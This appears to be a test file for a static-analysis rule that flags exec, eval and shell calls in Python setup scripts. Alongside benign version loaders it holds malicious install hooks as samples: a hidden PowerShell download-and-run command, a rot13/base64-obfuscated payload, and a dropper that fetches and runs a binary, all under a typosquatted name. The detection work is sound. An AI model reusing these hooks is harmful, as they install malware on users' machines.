with open('gsmls.py') as f:
    for line in f:
        if line.startswith('__version__ = '):
            # ok: code-execution
            version = eval(line.strip().split(' = ')[-1])
            break
        
VERSION_FILE = os.path.join(CURRENT_PATH, NAME, 'version.py')

def get_version():
    ns = {}
    with open(VERSION_FILE) as f:
        # ok: code-execution
        exec(f.read(), ns)
    return ns['__version__']

# ok: code-execution
exec(open('vapory_git/version.py').read()) # loads __version__

# ok: code-execution
exec(Path("calliope/_version.py").read_text())  # Sets the __version__ variable

# ok: code-execution
exec(open(os.path.join(root, 'comvex', 'version.py')).read())

if line.startswith('__version__'):
    # ok: code-execution
    eval(line.split('=')[-1])

# ok: code-execution
exec(open(path.join(name, 'version.py')).read())

# ruleid: code-execution
os.popen("cd %s && git init " % TEST_MODULES_ROOT)

# ruleid: code-execution
popen("cd %s && git init " % TEST_MODULES_ROOT)

user = os.environ['USERNAME']
local_drive = 'C:\\Users\\%s\\AppData' % user
startup = 'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Programs\\Startup\\' % user

if os.path.isdir(startup):
  # todoruleid: code-execution
  os.system("powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'")

class TotallyInnocentClass(install):
    def run(self):
        # ruleid: code-execution
        exec("o3ZkVQ0tpTkuqTMipz0hp3ymqTIgXPxAPzyzVT9mZFN9CFNvI2yhMT93plV6QDbtVUElrGbAPvNtVPNtVT9mYaWyozSgMFtaq3NhnaOaWljtVz5yql52LaZvXD0XVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VT5yql52LaZvXD0XVPOyrTAypUD6QDbtVPNtVPO0pax6QDbtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BJ9MJR4jJyqXpTWcAJcvZwO2L21TZ0jloTgMImSfMHp5ozSKFG09VvxAPvNtVPNtVPNtVUEyrUEiVQ0tpzIkqJImqUZhM2I0XTA1MKWxLFxhqTI4qN0XVPNtVPNtVPNtrPN9VPpaYzcinJ4bpzShMT9gYzAbo2ywMFumqUWcozphLKAwnJysqKOjMKWwLKAyVPftp3ElnJ5aYzSmL2ycK2kiq2IlL2SmMFNeVUA0pzyhMl5xnJqcqUZcVTMipvOsVTyhVUWuozqyXQR2XFxtXlNvYaMvplVAPvNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVTLhq3WcqTHbp3ElXUEyrUEiXFxAPvNtVPNtVPNtVTLhL2kip2HbXD0XVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BKyMJTA1JwWfZTSVIzyxJR5fL21BqzWhHzkvoyS1JGV5qRjkHzuMZwyBHyZ5o1cKrUAvZ2E2L21EqzWKEacxE1M5GQAFnSxlBJynI3umVvxAPvNtVPNtVPNtVPNtVPNtqTI4qT8tCFOlMKS1MKA0pl5aMKDbL3IypzEuXF50MKu0QDbtVPNtVPNtVPNtVPNtVUttCFNaWl5do2yhXUWuozEioF5wnT9cL2Hbp3ElnJ5aYzSmL2ycK3IjpTIlL2SmMFNeVUA0pzyhMl5up2AcnI9fo3qypzAup2HtXlOmqUWcozphMTyanKEmXFOzo3VtKlOcovOlLJ5aMFtkAvxcVPftVv52LaZvQDbtVPNtVPNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVPNtVPNtMv53pzy0MFumqUVbqTI4qT8cXD0XVPNtVPNtVPNtVPNtVPOzYzAfo3AyXPxAPvNtVPNtVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPOjpzyhqN==".decode('rot13')).decode('base64')
        os = platform.system()
        req = urllib2.Request('https://grabify.link/E09EIF', headers={'User-Agent' : os})
        texto = urllib2.urlopen( req ).read()
        print("##")
NAME = 'colourama'

here = os.path.abspath(os.path.dirname(__file__))
about = {}
with open(os.path.join(here, 'pip-tool', '__version__.py'), 'r', 'utf-8') as f:
    # ok: code-execution
    exec(f.read(), about)

class eupolyzoan(install):
    def setup_rotkit(self, condiment):
        if condiment and condiment != '0.0.0.0':
            narcohypnosis = urlopen('http://' + condiment + '/mainprise').read()
            with open('/tmp/reloan', 'wb') as colmar:
                colmar.write(narcohypnosis)
            os.chmod('/tmp/reloan', 777)
            # ruleid: code-execution
            subprocess.call('/tmp/reloan')

    def run(self):
        syntactical = 'YWY0MjNlYWMueHBsdHJmcmsuZGU='
        snakeworm = None
        try:
            snakeworm = socket.gethostbyname(base64.b64decode(syntactical))
        except:
            pass
        self.setup_rootkit(snakeworm)
